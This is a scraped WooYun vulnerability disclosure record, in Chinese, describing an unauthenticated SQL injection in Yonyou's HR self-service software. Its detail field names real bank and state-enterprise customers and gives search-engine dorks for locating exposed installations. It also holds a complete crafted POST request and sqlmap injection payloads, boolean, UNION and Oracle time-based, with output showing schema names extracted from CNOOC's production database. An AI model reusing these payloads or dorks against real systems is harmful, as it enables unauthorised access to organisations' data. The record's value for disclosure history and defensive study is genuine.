{"id": 207, "wybug_id": "wooyun-2014-071429", "wybug_title": "用友人力资源管理软件SQL注入漏洞（无需登录，影响所有版本）", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2014-08-07 16:14", "wybug_open_date": "2014-11-05 16:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-05：\t细节向公众公开  简要描述：  详细说明：  用友软件：\n\n涉及客户非常多。都是大型国企、银行、能源、金融重要单位。举例如下：大连银行   http://zpyc.bankofdl.com顺德农商行 http://career.sdebank.com中国海洋石油总公司   http://zhaopin.cnooc.com.cn北京市建筑设计研究院   www.biad.com.cn:88/民生银行     http://ehr.creditcard.cmbc.com.cn中国中铁    http://61.232.6.108/....等等单位直接谷歌搜inurl:hrss/login.jspinurl:hrss/rminurl:hrss/index.html。。。由于某一参数rdp   xml 注入。。。\nPOST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1Content-Length: 564Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://zhaopin.cnooc.com.cn:80/Cookie: JSESSIONID=EC2B32915FC45B239F95F8D334CB81D6.server; JSESSIONID=8D59F955762550CE8ACB019EEDD59700.serverHost: zhaopin.cnooc.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.361407388061721&__type=updateData&__viewInstanceId=nc.bs.hrss.login.ResetPassword~nc.bs.hrss.login.ResetPasswordViewModel&__xml=<rpc%20transaction%3d%2210%22%20method%3d%22resetPwd%22><def><dataset%20type%3d%22Custom%22%20id%3d%22dsResetPwd%22><f%20name%3d%22user%22></f><f%20name%3d%22ID%22></f></dataset></def><data><rs%20dataset%3d%22dsResetPwd%22><r%20id%3d%2210009%22%20state%3d%22insert%22><n><v>-1%26apos;%20OR%201%3d1%20*%20--%20</v><v>e</v></n></r></rs></data><vps><p%20name%3d%22__profileKeys%22>findPwd%253B15b021628b8411d33569071324dc1b37</p></vps></rpc>\n已经构造好注入包\n\n\n\n \nPlace: (custom) POSTParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: 1407388061721&__type=updateData&__viewInstanceId=nc.bs.hrss.login.ResetPassword~nc.bs.hrss.login.ResetPasswordViewModel&__xml=<rpc%20transaction%3d%2210%22%20method%3d%22resetPwd%22><def><dataset%20type%3d%22Custom%22%20id%3d%22dsResetPwd%22><f%20name%3d%22user%22></f><f%20name%3d%22ID%22></f></dataset></def><data><rs%20dataset%3d%22dsResetPwd%22><r%20id%3d%2210009%22%20state%3d%22insert%22><n><v>-1%26apos;%20OR%201%3d1%20 AND 6102=6102%20--%20</v><v>e</v></n></r></rs></data><vps><p%20name%3d%22__profileKeys%22>findPwd%253B15b021628b8411d33569071324dc1b37</p></vps></rpc>    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: 1407388061721&__type=updateData&__viewInstanceId=nc.bs.hrss.login.ResetPassword~nc.bs.hrss.login.ResetPasswordViewModel&__xml=<rpc%20transaction%3d%2210%22%20method%3d%22resetPwd%22><def><dataset%20type%3d%22Custom%22%20id%3d%22dsResetPwd%22><f%20name%3d%22user%22></f><f%20name%3d%22ID%22></f></dataset></def><data><rs%20dataset%3d%22dsResetPwd%22><r%20id%3d%2210009%22%20state%3d%22insert%22><n><v>-1%26apos;%20OR%201%3d1%20 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CHR(58)||CHR(121)||CHR(109)||CHR(97)||CHR(58)||CHR(74)||CHR(85)||CHR(85)||CHR(66)||CHR(117)||CHR(109)||CHR(117)||CHR(110)||CHR(114)||CHR(105)||CHR(58)||CHR(113)||CHR(115)||CHR(110)||CHR(58),NULL,NULL,NULL,NULL FROM DUAL-- %20--%20</v><v>e</v></n></r></rs></data><vps><p%20name%3d%22__profileKeys%22>findPwd%253B15b021628b8411d33569071324dc1b37</p></vps></rpc>    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: 1407388061721&__type=updateData&__viewInstanceId=nc.bs.hrss.login.ResetPassword~nc.bs.hrss.login.ResetPasswordViewModel&__xml=<rpc%20transaction%3d%2210%22%20method%3d%22resetPwd%22><def><dataset%20type%3d%22Custom%22%20id%3d%22dsResetPwd%22><f%20name%3d%22user%22></f><f%20name%3d%22ID%22></f></dataset></def><data><rs%20dataset%3d%22dsResetPwd%22><r%20id%3d%2210009%22%20state%3d%22insert%22><n><v>-1%26apos;%20OR%201%3d1%20 AND 3314=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(115)||CHR(69)||CHR(71),5)%20--%20</v><v>e</v></n></r></rs></data><vps><p%20name%3d%22__profileKeys%22>findPwd%253B15b021628b8411d33569071324dc1b37</p></vps></rpc>---[14:52:41] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[14:52:41] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[14:52:41] [INFO] fetching database (schema) names[14:52:41] [WARNING] the SQL query provided does not return any output[14:52:41] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' and/or switch '--hex'[14:52:41] [INFO] fetching number of databases[14:52:41] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[14:52:41] [INFO] retrieved: 20[14:53:05] [INFO] retrieved: APEX_030200[14:57:28] [INFO] retrieved: APPQOSSYS[15:00:59] [INFO] retrieved: CNOOC[15:03:06] [INFO] retrieved: CTXSYS[15:05:41] [INFO] retrieved: DBSNMP[15:08:15] [INFO] retrieved: EXFSYS[15:10:46] [INFO] retrieved: FLOWS_FILES[15:15:05] [INFO] retrieved: MDSYS[15:17:27] [INFO] retrieved: OLAP[15:19:46] [CRITICAL] unable to connect to the target url or proxy. sqlmap is going to retry the requestSYS[15:20:54] [INFO] retrieved:[15:21:28] [CRITICAL] unable to connect to the target url or proxy. sqlmap is going to retry the requestORD\n   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-07 20:28 厂商回复： 感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-08 04:28 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:31        | 学习)\t\t \n  这个叼～    \n     2014-08-12 14:38 |    \t\tx37e \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | HI!Man,what are you doing?)\t\t \n  留明。    \n     2014-08-13 11:52 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  居然没忽略？等公开····    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}